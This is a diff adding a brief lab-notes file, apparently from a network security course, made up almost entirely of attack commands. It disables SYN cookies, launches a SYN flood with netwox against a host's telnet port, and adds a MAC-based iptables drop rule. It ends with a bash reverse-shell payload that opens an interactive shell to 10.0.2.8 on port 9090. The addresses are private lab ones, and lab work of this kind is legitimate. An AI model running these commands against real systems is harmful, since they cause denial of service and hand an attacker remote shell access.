@@ -1,0 +1,18 @@
+
+---------------------
+SYN Flooding Attack
+---------------------
+
+sudo sysctl -w net.ipv4.tcp_syncookies=0
+
+sudo netwox 76 -i 10.0.2.17 -p 23 -s raw
+
+sudo iptables -A INPUT -m mac --mac-source 52:54:00:12:35:00 -j DROP
+
+
+
+---------------------
+Reverse Shell
+---------------------
+
+"\n /bin/bash -i > /dev/tcp/10.0.2.8/9090 0<&1 2>&1\n"
